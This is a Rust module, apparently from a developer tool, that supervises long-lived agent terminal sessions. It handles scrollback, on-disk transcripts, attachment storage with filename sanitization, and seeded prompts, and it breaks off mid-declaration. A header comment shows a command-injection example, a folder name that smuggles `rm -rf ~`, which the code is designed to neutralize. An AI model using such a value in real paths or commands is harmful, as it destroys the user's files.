//! Agent supervisor: PTY sessions whose processes outlive the WebSocket that
//! started them.
//!
//! `ws/shell.rs` spawns a PTY *inside* the socket handler, so closing the tab
//! kills the shell. That is right for a scratch terminal and wrong for an
//! agent: the whole point is that you close the tab, the agent keeps working,
//! and you reattach later to see what happened. So the PTY lives here, in a
//! process-global registry, and sockets merely attach to it.
//!
//! Threading follows `ws/shell.rs`: `portable-pty`'s reader is blocking and
//! gets its own OS thread, bridged to async through an `mpsc`. Nothing in this
//! module blocks the tokio executor.
//!
//! ## Security
//!
//! Agent definitions are user-supplied commands executed with the user's full
//! privileges — that is the feature. What is *not* acceptable is letting a
//! string be re-parsed by a shell: a workspace folder called `foo; rm -rf ~`
//! must be completely inert. Every spawn therefore goes through [`SpawnPlan`],
//! which carries a program and an argument *vector*, and is handed to
//! `CommandBuilder::new(prog)` + one `.arg()` per element. There is no code
//! path in this module that formats a command into a string.

use std::collections::{HashSet, VecDeque};
use std::io::{Read, Write};
use std::path::{Component, Path, PathBuf};
use std::sync::atomic::AtomicU64;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use dashmap::DashMap;
use regex::Regex;
use portable_pty::{native_pty_system, ChildKiller, CommandBuilder, MasterPty, PtySize};
use sqlx::SqlitePool;
use tokio::io::AsyncWriteExt;
use tokio::sync::{broadcast, mpsc, oneshot};
use uuid::Uuid;

use crate::error::AppError;

/// Per-session scrollback cap. Replaying a blank terminal is useless, but an
/// agent in a loop can emit megabytes, so the buffer is a ring: newest wins.
pub const SCROLLBACK_CAPACITY: usize = 256 * 1024;

/// Live (still running) sessions allowed at once. A runaway agent that spawns
/// agents would otherwise fork until the machine dies; past this the API layer
/// answers 429.
pub const MAX_LIVE_SESSIONS: usize = 16;

/// Broadcast backlog per subscriber. A subscriber slower than this lags and
/// drops frames — it never stalls the PTY reader or the other subscribers.
const OUTPUT_CHANNEL_CAPACITY: usize = 256;

/// Chunks in flight between the blocking reader thread and the async pump.
const PTY_CHANNEL_CAPACITY: usize = 64;

/// `last_activity_at` is a coarse "is anything happening" signal, not an audit
/// log. Writing it per output chunk would hammer SQLite for no benefit.
const ACTIVITY_TOUCH_INTERVAL_SECS: i64 = 10;

/// How recently a session must have produced output to count as `working`.
///
/// Long enough that the pauses inside a streaming response do not flicker the
/// indicator, short enough that arriving at a prompt shows up right away.
pub const ACTIVITY_WORKING_WINDOW: Duration = Duration::from_millis(1500);

/// How much of the scrollback tail is searched for a prompt pattern. A prompt
/// is the last thing on screen; scanning further back would only let an old,
/// already-answered question keep reporting `high` confidence forever.
pub const PROMPT_SCAN_BYTES: usize = 2048;

/// Grace period between SIGTERM and SIGKILL when killing a session's process
/// group.
#[cfg(unix)]
const KILL_GRACE: std::time::Duration = std::time::Duration::from_secs(3);

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

#[derive(Debug, thiserror::Error)]
pub enum AgentError {
    #[error("agent session '{0}' not found")]
    NotFound(String),
    #[error("workspace '{0}' not found")]
    WorkspaceNotFound(String),
    /// Nothing said where to run: no `cwd` on the request and no folder bound
    /// to the workspace. We never fall back to `$HOME` — an agent silently
    /// operating on the wrong tree is worse than one that refuses to start.
    #[error(
        "workspace '{0}' has no folder bound and no cwd was given — \
         bind a folder or pass an explicit cwd"
    )]
    NoCwd(String),
    #[error("workspace folder '{0}' is not an existing directory")]
    WorkspaceFolderMissing(String),
    #[error("cwd '{0}' is not an existing directory")]
    CwdMissing(String),
    #[error("agent command is empty")]
    EmptyCommand,
    #[error("too many live agent sessions ({max} max) — stop one before starting another")]
    CapacityExceeded { max: usize },
    #[error("failed to start agent: {0}")]
    Spawn(String),
    /// Storing a seeded session's attachments failed. The session is not
    /// started at all: an agent primed with the path of a file that is not
    /// there is worse than one that never ran.
    #[error("failed to store agent attachments: {0}")]
    Attachment(String),
    /// More attached bytes than one session may carry.
    #[error(
        "attachments total {total} bytes, above the {max} byte limit for one session"
    )]
    AttachmentsTooLarge { total: usize, max: usize },
    #[error("database error: {0}")]
    Database(#[from] sqlx::Error),
}

impl From<AgentError> for AppError {
    fn from(e: AgentError) -> Self {
        match e {
            AgentError::NotFound(_) | AgentError::WorkspaceNotFound(_) => {
                AppError::NotFound(e.to_string())
            }
            AgentError::NoCwd(_)
            | AgentError::WorkspaceFolderMissing(_)
            | AgentError::CwdMissing(_)
            | AgentError::EmptyCommand => AppError::BadRequest(e.to_string()),
            AgentError::CapacityExceeded { .. } => AppError::TooManyRequests(e.to_string()),
            AgentError::AttachmentsTooLarge { .. } => AppError::PayloadTooLarge(e.to_string()),
            AgentError::Spawn(_) | AgentError::Attachment(_) => AppError::Internal(e.to_string()),
            AgentError::Database(err) => AppError::Database(err),
        }
    }
}

// ---------------------------------------------------------------------------
// Scrollback ring buffer (pure — see tests)
// ---------------------------------------------------------------------------

/// A byte ring buffer that keeps the most recent `capacity` bytes.
///
/// Truncation is byte-oriented, not line- or UTF-8-oriented: a replay may start
/// mid-codepoint or mid-escape-sequence. That is the correct trade-off for a
/// terminal — xterm.js tolerates a partial sequence at the head of a stream,
/// whereas scanning for a safe boundary would mean unbounded lookahead.
#[derive(Debug)]
pub struct ScrollbackBuffer {
    capacity: usize,
    buf: VecDeque<u8>,
}

impl ScrollbackBuffer {
    pub fn new(capacity: usize) -> Self {
        Self {
            capacity,
            buf: VecDeque::new(),
        }
    }

    pub fn len(&self) -> usize {
        self.buf.len()
    }

    pub fn is_empty(&self) -> bool {
        self.buf.is_empty()
    }

    pub fn capacity(&self) -> usize {
        self.capacity
    }

    /// Appends `data`, evicting from the front so the total never exceeds
    /// `capacity`. A single write larger than the buffer keeps only its tail.
    pub fn push(&mut self, data: &[u8]) {
        if self.capacity == 0 {
            return;
        }
        if data.len() >= self.capacity {
            self.buf.clear();
            self.buf.extend(&data[data.len() - self.capacity..]);
            return;
        }
        let overflow = (self.buf.len() + data.len()).saturating_sub(self.capacity);
        self.buf.drain(..overflow);
        self.buf.extend(data);
    }

    /// The bytes to replay on attach, oldest retained byte first.
    pub fn snapshot(&self) -> Vec<u8> {
        let (a, b) = self.buf.as_slices();
        let mut out = Vec::with_capacity(a.len() + b.len());
        out.extend_from_slice(a);
        out.extend_from_slice(b);
        out
    }

    /// The most recent `n` retained bytes. Used for prompt detection, which
    /// only ever cares about what is currently on screen.
    pub fn tail(&self, n: usize) -> Vec<u8> {
        let skip = self.buf.len().saturating_sub(n);
        self.buf.iter().skip(skip).copied().collect()
    }
}

// ---------------------------------------------------------------------------
// Durable transcripts
// ---------------------------------------------------------------------------
//
// The scrollback above dies with the process that holds it, so a server
// restart used to leave a session listed but unreadable — for an agent that
// ran overnight the transcript *is* the artefact. Every session therefore also
// streams its output to `<data_dir>/agent-logs/<session_id>.log` as it
// arrives, not at exit: a crash or a force-quit is exactly when you most want
// to read what happened.
//
// Everything here is best effort. A write failure is logged and the session
// carries on — a full disk must not kill a working agent.

/// Directory, beside the database, that holds one log file per session.
pub const TRANSCRIPT_DIR_NAME: &str = "agent-logs";

/// Bytes kept per on-disk transcript, newest wins — the same rule as
/// [`ScrollbackBuffer`], four times the size. Disk is cheaper than RAM, and an
/// overnight run deserves more history than a tab does.
pub const TRANSCRIPT_CAP: usize = 1024 * 1024;

/// How far past [`TRANSCRIPT_CAP`] a file may grow before it is rewritten to
/// its tail. Compaction copies the whole cap, so doing it on every flush past
/// the limit would turn a chatty agent into a disk benchmark; this trades a
/// little slack for one rewrite per 256 KiB of overflow.
pub const TRANSCRIPT_SLACK: usize = 256 * 1024;

/// Exited sessions kept per workspace. Rows and logs beyond this are dropped
/// on startup, oldest first — see [`prune_agent_sessions`].
pub const TRANSCRIPT_RETENTION_PER_WORKSPACE: usize = 200;

/// Chunks queued between the output pump and the writer task. Deep enough to
/// ride out a slow flush; past it chunks are dropped rather than awaited, so
/// the disk can never back up into the PTY.
const TRANSCRIPT_QUEUE_CAPACITY: usize = 512;

/// Buffered output is flushed at least this often, so an unclean exit loses at
/// most this much of the transcript.
const TRANSCRIPT_FLUSH_INTERVAL: Duration = Duration::from_millis(250);

/// …and immediately once this much has accumulated, so a burst does not sit in
/// memory waiting for the tick.
const TRANSCRIPT_FLUSH_BYTES: usize = 32 * 1024;

/// The transcript directory belonging to a `DATABASE_URL`: `agent-logs` beside
/// the database file, so both live in the same app-data directory (see
/// `main.rs` for how that default is built).
///
/// A URL with no directory part — `sqlite::memory:`, a bare filename — resolves
/// relative to the process's working directory, which is what a caller passing
/// a bare filename for the database already asked for.
pub fn transcript_dir_for_database_url(database_url: &str) -> PathBuf {
    let path = database_url
        .strip_prefix("sqlite://")
        .or_else(|| database_url.strip_prefix("sqlite:"))
        .or_else(|| database_url.strip_prefix("file:"))
        .unwrap_or(database_url);
    // sqlx accepts `?mode=rwc`-style parameters; they are not part of the path.
    let path = path.split('?').next().unwrap_or(path);

    Path::new(path)
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .map(Path::to_path_buf)
        .unwrap_or_else(|| PathBuf::from("."))
        .join(TRANSCRIPT_DIR_NAME)
}

/// A session id in its one canonical spelling, or `None` when it is not a plain
/// UUID.
///
/// Session ids are server-generated UUIDs, but this is the only shape allowed to
/// become a path, so it validates rather than trusts: anything with a separator,
/// a `..`, or any other shape is rejected outright instead of being sanitized
/// into something that looks close enough.
pub fn canonical_session_id(session_id: &str) -> Option<String> {
    let canonical = Uuid::parse_str(session_id).ok()?.hyphenated().to_string();
    // `parse_str` also accepts braced, URN and unhyphenated forms. Those are
    // valid UUIDs but not *this* id shape, and accepting them would mean two
    // spellings of one session mapping to one file.
    (session_id.len() == canonical.len() && session_id.eq_ignore_ascii_case(&canonical))
        .then_some(canonical)
}

/// The log file name for a session id, or `None` when the id is not a plain
/// UUID.
pub fn transcript_file_name(session_id: &str) -> Option<String> {
    canonical_session_id(session_id).map(|canonical| format!("{canonical}.log"))
}

/// The session id a log file name refers to, or `None` if it is not one of
/// ours (a partly written `.log.tmp`, or anything else that got dropped in).
fn transcript_id_from_file_name(name: &str) -> Option<String> {
    let stem = name.strip_suffix(".log")?;
    transcript_file_name(stem).map(|_| stem.to_string())
}

/// The newest `cap` bytes of `data`. The on-disk cap follows the in-memory
/// ring: when something has to go, it is the oldest output.
pub fn tail_bytes(data: &[u8], cap: usize) -> &[u8] {
    let skip = data.len().saturating_sub(cap);
    &data[skip..]
}

/// Whether a file this long should be rewritten down to its tail.
pub fn needs_compaction(len: usize, cap: usize, slack: usize) -> bool {
    len > cap.saturating_add(slack)
}

/// The session ids to drop, given every session ordered by workspace and then
/// newest first, keeping at most `keep_per_workspace` of each workspace's.
///
/// Per workspace rather than globally so one busy workspace cannot evict
/// another's history, and oldest-first so the rule is one a user could predict:
/// the last N runs of this workspace are always there.
pub fn sessions_to_prune(
    ordered_by_workspace_newest_first: &[(String, String)],
    keep_per_workspace: usize,
) -> Vec<String> {
    let mut doomed = Vec::new();
    let mut current: Option<&str> = None;
    let mut kept = 0usize;

    for (workspace_id, session_id) in ordered_by_workspace_newest_first {
        if current != Some(workspace_id.as_str()) {
            current = Some(workspace_id);
            kept = 0;
        }
        kept += 1;
        if kept > keep_per_workspace {
            doomed.push(session_id.clone());
        }
    }
    doomed
}

/// Reads and writes session transcripts under one directory.
///
/// Cheap to clone — it is a path and nothing else. Every method is best effort
/// and reports failure by returning "nothing there", because a transcript that
/// cannot be read is indistinguishable to the user from one that was never
/// written, and neither is worth failing a request over.
#[derive(Clone, Debug)]
pub struct TranscriptStore {
    dir: Arc<PathBuf>,
}

impl TranscriptStore {
    pub fn new(dir: PathBuf) -> Self {
        Self { dir: Arc::new(dir) }
    }

    pub fn dir(&self) -> &Path {
        self.dir.as_path()
    }

    /// The path a session's transcript would live at, or `None` when the id is
    /// not a plain UUID.
    pub fn path_for(&self, session_id: &str) -> Option<PathBuf> {
        transcript_file_name(session_id).map(|name| self.dir.join(name))
    }

    /// The transcript, capped to its newest [`TRANSCRIPT_CAP`] bytes, or `None`
    /// when there is no file. An existing but empty file returns `Some(vec![])`
    /// — "ran and said nothing" is a different fact from "never recorded".
    pub async fn read(&self, session_id: &str) -> Option<Vec<u8>> {
        let path = self.path_for(session_id)?;
        match tokio::fs::read(&path).await {
            Ok(data) => Some(tail_bytes(&data, TRANSCRIPT_CAP).to_vec()),
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => None,
            Err(e) => {
                tracing::warn!(path = %path.display(), error = %e, "failed to read agent transcript");
                None
            }
        }
    }

    pub async fn has(&self, session_id: &str) -> bool {
        match self.path_for(session_id) {
            Some(path) => tokio::fs::metadata(&path).await.is_ok(),
            None => false,
        }
    }

    /// Every session id with a transcript on disk, from ONE directory read.
    ///
    /// The list endpoint needs this for many rows at once; stat-ing per row
    /// would turn one page of sessions into a page of syscalls.
    pub async fn list_ids(&self) -> HashSet<String> {
        let mut ids = HashSet::new();
        let Ok(mut entries) = tokio::fs::read_dir(self.dir.as_path()).await else {
            return ids;
        };
        while let Ok(Some(entry)) = entries.next_entry().await {
            if let Some(id) = transcript_id_from_file_name(&entry.file_name().to_string_lossy()) {
                ids.insert(id);
            }
        }
        ids
    }

    /// Removes a session's transcript. Missing is success.
    pub async fn delete(&self, session_id: &str) {
        let Some(path) = self.path_for(session_id) else {
            return;
        };
        if let Err(e) = tokio::fs::remove_file(&path).await {
            if e.kind() != std::io::ErrorKind::NotFound {
                tracing::warn!(path = %path.display(), error = %e, "failed to delete agent transcript");
            }
        }
    }

    /// Removes a file by name, used by the orphan sweep for leftovers that have
    /// no session id (a `.log.tmp` from an interrupted compaction).
    async fn delete_file_name(&self, name: &str) {
        let path = self.dir.join(name);
        let _ = tokio::fs::remove_file(&path).await;
    }

    /// Starts a writer task for a session and returns the handle the output
    /// pump feeds. `None` when the id is not a plain UUID — the session then
    /// simply has no transcript rather than writing to a guessed path.
    pub fn writer(&self, session_id: &str) -> Option<TranscriptWriter> {
        let path = self.path_for(session_id)?;
        let (tx, rx) = mpsc::channel::<Vec<u8>>(TRANSCRIPT_QUEUE_CAPACITY);
        let dropped = Arc::new(AtomicU64::new(0));

        tokio::spawn(transcript_writer_task(path, rx, dropped.clone()));

        Some(TranscriptWriter { tx, dropped })
    }
}

/// The output pump's end of a session's transcript.
///
/// Deliberately synchronous and non-blocking: it is called from the same task
/// that fans output out to attached sockets, and disk latency must never reach
/// them.
#[derive(Clone, Debug)]
pub struct TranscriptWriter {
    tx: mpsc::Sender<Vec<u8>>,
    /// Chunks the writer never saw because the queue was full. Reported into
    /// the transcript itself at the next flush — a gap the reader can see beats
    /// a gap they cannot.
    dropped: Arc<AtomicU64>,
}

impl TranscriptWriter {
    /// Queues a chunk. Returns immediately, always: a queue that has backed up
    /// behind a stalled disk drops the chunk rather than waiting, because the
    /// alternative is stalling the pump, then the PTY reader, then the agent.
    pub fn write(&self, chunk: &[u8]) {
        if self.tx.try_send(chunk.to_vec()).is_err() {
            self.dropped
                .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        }
    }
}

/// Rewrites `path` down to its newest [`TRANSCRIPT_CAP`] bytes.
///
/// Through a temporary file and a rename so an interrupted compaction leaves
/// the previous transcript whole rather than a half-written one.
async fn compact_transcript(path: &Path) -> std::io::Result<u64> {
    let data = tokio::fs::read(path).await?;
    let tail = tail_bytes(&data, TRANSCRIPT_CAP);

    let tmp = path.with_extension("log.tmp");
    tokio::fs::write(&tmp, tail).await?;
    tokio::fs::rename(&tmp, path).await?;
    Ok(tail.len() as u64)
}

/// Owns a session's log file for the life of the session.
///
/// Entirely async (`tokio::fs`): the PTY reader thread and the output pump both
/// hand off here and neither ever touches the disk.
async fn transcript_writer_task(
    path: PathBuf,
    mut rx: mpsc::Receiver<Vec<u8>>,
    dropped: Arc<AtomicU64>,
) {
    if let Some(parent) = path.parent() {
        if let Err(e) = tokio::fs::create_dir_all(parent).await {
            tracing::warn!(dir = %parent.display(), error = %e, "cannot create agent transcript directory");
            return;
        }
    }

    let mut file = match tokio::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(&path)
        .await
    {
        Ok(f) => f,
        Err(e) => {
            tracing::warn!(path = %path.display(), error = %e, "cannot open agent transcript");
            return;
        }
    };

    let mut on_disk = file.metadata().await.map(|m| m.len()).unwrap_or(0);
    let mut buf: Vec<u8> = Vec::with_capacity(TRANSCRIPT_FLUSH_BYTES);
    let mut warned = false;

    let mut ticker = tokio::time::interval(TRANSCRIPT_FLUSH_INTERVAL);
    ticker.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        let (closed, flush) = tokio::select! {
            received = rx.recv() => match received {
                Some(chunk) => {
                    buf.extend_from_slice(&chunk);
                    // Size threshold: a burst is not left sitting in memory
                    // waiting for the tick.
                    (false, buf.len() >= TRANSCRIPT_FLUSH_BYTES)
                }
                // The pump is gone: the session ended. Flush and finish.
                None => (true, true),
            },
            _ = ticker.tick() => (false, !buf.is_empty()),
        };

        if !flush {
            continue;
        }

        let lost = dropped.swap(0, std::sync::atomic::Ordering::Relaxed);
        if lost > 0 {
            let notice = format!(
                "\r\n[transcript: {lost} chunk(s) of output not recorded — the disk fell behind]\r\n"
            );
            // Prepended to this flush, so the gap is marked roughly where it
            // happened rather than silently stitched over.
            let mut marked = notice.into_bytes();
            marked.append(&mut buf);
            buf = marked;
        }

        match write_all_and_flush(&mut file, &buf).await {
            Ok(()) => on_disk += buf.len() as u64,
            Err(e) => {
                // Non-fatal by design: the agent keeps running and its output
                // keeps reaching attached sockets. Warn once so a full disk is
                // one line in the log, not one per flush.
                if !warned {
                    warned = true;
                    tracing::warn!(path = %path.display(), error = %e, "agent transcript write failed — continuing without it");
                }
            }
        }
        buf.clear();

        if needs_compaction(on_disk as usize, TRANSCRIPT_CAP, TRANSCRIPT_SLACK) {
            match compact_transcript(&path).await {
                Ok(len) => {
                    on_disk = len;
                    // The rename replaced the inode; the old handle would keep
                    // appending to a file nobody can see.
                    match tokio::fs::OpenOptions::new().append(true).open(&path).await {
                        Ok(f) => file = f,
                        Err(e) => {
                            tracing::warn!(path = %path.display(), error = %e, "lost agent transcript after compaction");
                            return;
                        }
                    }
                }
                Err(e) => {
                    tracing::warn!(path = %path.display(), error = %e, "failed to compact agent transcript");
                    // Do not retry every flush; let it grow to the next
                    // threshold instead of hammering a failing disk.
                    on_disk = TRANSCRIPT_CAP as u64;
                }
            }
        }

        if closed {
            return;
        }
    }
}

async fn write_all_and_flush(file: &mut tokio::fs::File, data: &[u8]) -> std::io::Result<()> {
    file.write_all(data).await?;
    file.flush().await
}

// ---------------------------------------------------------------------------
// Seeded sessions: a task and its attached context
// ---------------------------------------------------------------------------
//
// Starting an agent from a Kubernetes view means handing it both a task
// ("explain these logs") and the output it is about. The output does NOT go
// into the PTY.
//
// A terminal cannot take a large paste reliably: every newline is a submit
// keystroke to an interactive CLI, bracketed-paste support varies per agent,
// and pod logs are routinely megabytes. So attachments are written to FILES and
// the composed prompt merely names their absolute paths — robust at any size,
// and every agent reads files well.
//
// The files go under the app-data directory beside the database, never into the
// user's workspace folder: that is their repo, and dropping log files into it is
// not ours to do.

/// Directory, beside the database, holding one sub-directory of attachments per
/// seeded session.
pub const ATTACHMENT_DIR_NAME: &str = "agent-attachments";

/// Total attachment bytes accepted for one session. Generous, because a pod's
/// logs are the point; past it the API answers 413 rather than filling the disk.
pub const MAX_ATTACHMENT_TOTAL_BYTES: usize = 8 * 1024 * 1024;

/// Longest attachment file name, in characters. Long enough for a pod name plus
/// a container and an extension, short enough to stay under every filesystem's
/// per-component limit once the ordinal prefix is added.
pub const ATTACHMENT_NAME_MAX_CHARS: usize = 80;

/// How long the seeder waits for the agent to become ready before giving up.
///
/// Bounded because a session that never becomes ready must still be usable: an
/// undelivered prompt the user can retype beats a hang.
pub const SEED_READY_TIMEOUT: Duration = Duration::from_secs(30);

/// How often readiness is re-checked while waiting.
const SEED_POLL_INTERVAL: Duration = Duration::from_millis(100);

/// Pause between the prompt text and the carriage return that submits it.
///
/// A TUI agent draws the text into an input box before it handles Enter; the two
/// arriving in one write is usually fine and occasionally is not, and 150ms is
/// invisible next to the seconds already spent waiting for readiness.
const SEED_SUBMIT_DELAY: Duration = Duration::from_millis(150);

/// One file to place beside a seeded session, exactly as the client sent it.
///
/// `name` is client-supplied and is NOT trusted as a filename — it goes through
/// [`attachment_file_name`] before it ever touches the disk.
#[derive(Debug, Clone)]
pub struct SeedAttachment {
    pub name: String,
    pub content: String,
}

/// The task and context a session is primed with.
#[derive(Debug, Clone, Default)]
pub struct SessionSeed {
    pub prompt: Option<String>,
    pub attachments: Vec<SeedAttachment>,
}

impl SessionSeed {
    /// Whether there is anything to seed at all. A request carrying neither a
    /// prompt nor an attachment is not an error, it is simply an ordinary
    /// session.
    pub fn is_empty(&self) -> bool {
        self.prompt.as_deref().map(str::trim).unwrap_or("").is_empty()
            && self.attachments.is_empty()
    }
}

/// How far a session's seed prompt got. Persisted so the UI can say the prompt
/// was not delivered rather than leaving the user wondering why nothing
/// happened.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SeedStatus {
    /// Nothing to send — an ordinary session.
    None,
    /// Composed and waiting for the agent to be ready for input.
    Pending,
    Sent,
    /// The agent never went quiet within [`SEED_READY_TIMEOUT`]. The session is
    /// still perfectly usable; only the prompt was not delivered.
    TimedOut,
    /// The process exited before it was ready, or the write failed.
    Failed,
}

impl SeedStatus {
    pub fn as_str(&self) -> &'static str {
        match self {
            SeedStatus::None => "none",
            SeedStatus::Pending => "pending",
            SeedStatus::Sent => "sent",
            SeedStatus::TimedOut => "timed_out",
            SeedStatus::Failed => "failed",
        }
    }
}

/// The total size of a set of attachments.
pub fn attachments_total_bytes(attachments: &[SeedAttachment]) -> usize {
    attachments
        .iter()
        .fold(0usize, |acc, a| acc.saturating_add(a.content.len()))
}

/// Enforces the per-session attachment budget, returning the accepted total.
pub fn check_attachment_budget(
    attachments: &[SeedAttachment],
    max: usize,
) -> Result<usize, AgentError> {
    let total = attachments_total_bytes(attachments);
    if total > max {
        return Err(AgentError::AttachmentsTooLarge { total, max });
    }
    Ok(total)
}

/// Turns a client-supplied attachment name into a single, harmless path
/// component, or `None` when nothing usable survives.
///
/// The name arrives over the wire and becomes a filename, so it is treated as
/// hostile: separators, drive letters and the other characters that steer a path
/// are replaced, control characters (including NUL) go with them, and leading or
/// trailing dots are stripped so `.` and `..` cannot be spelled at all. The
/// final guard is structural rather than a blocklist — the result must parse as
/// exactly one [`Component::Normal`], the same rule `fs::resolve_in_workspace`
/// applies to client paths.
pub fn sanitize_attachment_name(name: &str) -> Option<String> {
    let replaced: String = name
        .chars()
        .map(|c| {
            if c.is_control() || matches!(c, '/' | '\\' | ':' | '*' | '?' | '"' | '<' | '>' | '|') {
                '-'
            } else {
                c
            }
        })
        .collect();

    // Dots only at the edges: this is what makes `..` and `.` unrepresentable,
    // while `pod.log` keeps its extension.
    let trimmed = replaced.trim().trim_matches('.').trim();

    // Char-wise, never byte-wise — a name may hold any UTF-8 and a byte slice
    // would land mid-codepoint.
    let capped: String = trimmed.chars().take(ATTACHMENT_NAME_MAX_CHARS).collect();
    let capped = capped.trim().to_string();

    // A name made entirely of what the replacements left behind — `../..`
    // becomes `-` — names nothing. Requiring one alphanumeric keeps such a name
    // from being stored as punctuation the user cannot recognise; the caller's
    // positional default is more use than `--`.
    if !capped.chars().any(char::is_alphanumeric) {
        return None;
    }

    // Structural check, not a blocklist: whatever the replacements above missed,
    // a name that is not exactly one ordinary component never reaches the disk.
    let path = Path::new(&capped);
    let mut components = path.components();
    match (components.next(), components.next()) {
        (Some(Component::Normal(_)), None) => Some(capped),
        _ => None,
    }
}

/// The file name an attachment is stored under.
///
/// The ordinal prefix is not decoration. Two attachments in one request may
/// share a name — two containers' logs are both `logs.txt` — and without it the
/// second would silently overwrite the first. It also guarantees a name that
/// sanitizes away entirely still gets a file.
pub fn attachment_file_name(index: usize, name: &str) -> String {
    let base = sanitize_attachment_name(name).unwrap_or_else(|| "attachment".to_string());
    format!("{:02}-{base}", index + 1)
}

/// Composes what the agent is actually asked, or `None` when there is nothing
/// to ask.
///
/// Deliberately mechanical: the caller's wording, then the paths of the files
/// they attached. No invented instructions and no persona — the caller supplies
/// the task, this only tells the agent where the context is.
pub fn compose_seed_prompt(initial_prompt: Option<&str>, attachment_paths: &[String]) -> Option<String> {
    let prompt = initial_prompt.map(str::trim).filter(|p| !p.is_empty());

    match (prompt, attachment_paths.is_empty()) {
        (None, true) => None,
        (Some(prompt), true) => Some(prompt.to_string()),
        (prompt, false) => {
            let mut out = String::new();
            if let Some(prompt) = prompt {
                out.push_str(prompt);
                out.push_str("\n\n");
            }
            out.push_str("Attached files:\n");
            out.push_str(&attachment_paths.join("\n"));
            Some(out)
        }
    }
}

/// The attachment directory belonging to a transcript directory: a sibling of
/// it, so both sit in the same app-data directory as the database.
///
/// Derived from the transcript directory rather than from `DATABASE_URL` again
/// so there is one answer to "where is the app-data directory" and the two can
/// never drift apart.
pub fn attachment_dir_beside_transcripts(transcript_dir: &Path) -> PathBuf {
    transcript_dir
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .unwrap_or_else(|| Path::new("."))
        .join(ATTACHMENT_DIR_NAME)
}

/// Reads and writes per-session attachment directories under one root.
///
/// Cheap to clone — it is a path and nothing else.
#[derive(Clone, Debug)]
pub struct AttachmentStore {
    dir: Arc<PathBuf>,
}

impl AttachmentStore {
    pub fn new(dir: PathBuf) -> Self {
        Self { dir: Arc::new(dir) }
    }

    pub fn dir(&self) -> &Path {
        self.dir.as_path()
    }

    /// A session's own directory, or `None` when the id is not a plain UUID.
    pub fn dir_for(&self, session_id: &str) -> Option<PathBuf> {
        canonical_session_id(session_id).map(|id| self.dir.join(id))
    }

    /// Writes every attachment and returns their ABSOLUTE paths, in order.
    ///
    /// Absolute because the paths go into the prompt and the agent's working
    /// directory is the workspace folder, not ours — a relative path would name
    /// a file that is not there.
    pub async fn write_all(
        &self,
        session_id: &str,
        attachments: &[SeedAttachment],
    ) -> std::io::Result<Vec<String>> {
        let dir = self
            .dir_for(session_id)
            .ok_or_else(|| std::io::Error::other("session id is not a plain UUID"))?;
        tokio::fs::create_dir_all(&dir).await?;
        let dir = tokio::fs::canonicalize(&dir).await.unwrap_or(dir);

        let mut paths = Vec::with_capacity(attachments.len());
        for (index, attachment) in attachments.iter().enumerate() {
            let path = dir.join(attachment_file_name(index, &attachment.name));
            tokio::fs::write(&path, attachment.content.as_bytes()).await?;
            paths.push(path.to_string_lossy().into_owned());
        }
        Ok(paths)
    }

    /// Removes a session's attachments. Missing is success.
    pub async fn delete(&self, session_id: &str) {
        let Some(dir) = self.dir_for(session_id) else {
            return;
        };
        if let Err(e) = tokio::fs::remove_dir_all(&dir).await {
            if e.kind() != std::io::ErrorKind::NotFound {
                tracing::warn!(dir = %dir.display(), error = %e, "failed to delete agent attachments");
            }
        }
    }

    /// Every session id with an attachment directory, from ONE directory read.
    pub async fn list_ids(&self) -> HashSet<String> {
        let mut ids = HashSet::new();
        let Ok(mut entries) = tokio::fs::read_dir(self.dir.as_path()).await else {
            return ids;
        };
        while let Ok(Some(entry)) = entries.next_entry().await {
            if let Some(id) = canonical_session_id(&entry.file_name().to_string_lossy()) {
                ids.insert(id);
            }
        }
        ids
    }
}

/// Records how a session's seeding ended.
async fn record_seed_status(db: &SqlitePool, session_id: &str, status: SeedStatus) {
    if let Err(e) = sqlx::query("UPDATE agent_sessions SET seed_status = ? WHERE id = ?")
        .bind(status.as_str())
        .bind(session_id)
        .execute(db)
        .await
    {
        tracing::warn!(session = %session_id, error = %e, "failed to record agent seed status");
    }
}

/// Waits for the agent to be ready for input, then writes the seeded prompt.
///
/// **Timing is the whole difficulty here.** Bytes written before the agent draws
/// its prompt are swallowed or mangled: agents print a banner, initialise, and
/// only then start reading. The readiness signal reused here is the one the
/// activity indicator already derives — the session has produced output and then
/// gone quiet for [`ACTIVITY_WORKING_WINDOW`]. It is a proxy, not an
/// observation (see [`Activity`]), which is exactly why the wait is bounded.
///
/// Runs on its own task: nothing in a request handler ever waits for this.
async fn seed_session_when_ready(db: SqlitePool, session: Arc<AgentSession>, prompt: String) {
    // Exactly once per session, whatever the caller does. A second send would
    // inject the prompt into the middle of the agent's work.
    if !session.claim_seed() {
        return;
    }

    let deadline = Instant::now() + SEED_READY_TIMEOUT;
    let status = loop {
        // A process that died before it was ready is never written to — the
        // write would go nowhere and `sent` would be a lie.
        if !session.is_running() {
            break SeedStatus::Failed;
        }
        // `has_produced_output` matters: `last_output` is seeded at spawn, so
        // without it a session that has printed nothing at all would read as
        // quiet-after-working the moment the window elapsed.
        if session.has_produced_output() && session.activity().0 == Activity::Waiting {
            break match session.write_input(prompt.into_bytes()).await {
                Ok(()) => {
                    tokio::time::sleep(SEED_SUBMIT_DELAY).await;
                    match session.write_input(b"\r".to_vec()).await {
                        Ok(()) => SeedStatus::Sent,
                        Err(_) => SeedStatus::Failed,
                    }
                }
                Err(e) => {
                    tracing::warn!(session = %session.id, error = %e, "failed to write agent seed prompt");
                    SeedStatus::Failed
                }
            };
        }
        if Instant::now() >= deadline {
            break SeedStatus::TimedOut;
        }
        tokio::time::sleep(SEED_POLL_INTERVAL).await;
    };

    if status != SeedStatus::Sent {
        tracing::info!(
            session = %session.id,
            status = status.as_str(),
            "agent seed prompt was not delivered"
        );
    }
    record_seed_status(&db, &session.id, status).await;
}

/// Startup retention: drops rows and logs for exited sessions beyond the most
/// recent [`TRANSCRIPT_RETENTION_PER_WORKSPACE`] per workspace, oldest first,
/// then sweeps log files that no longer have a row at all.
///
/// Without this both the table and the directory grow forever. With it the rule
/// is one a user could state: your last N runs per workspace are kept, and
/// nothing else is.
pub async fn prune_agent_sessions(
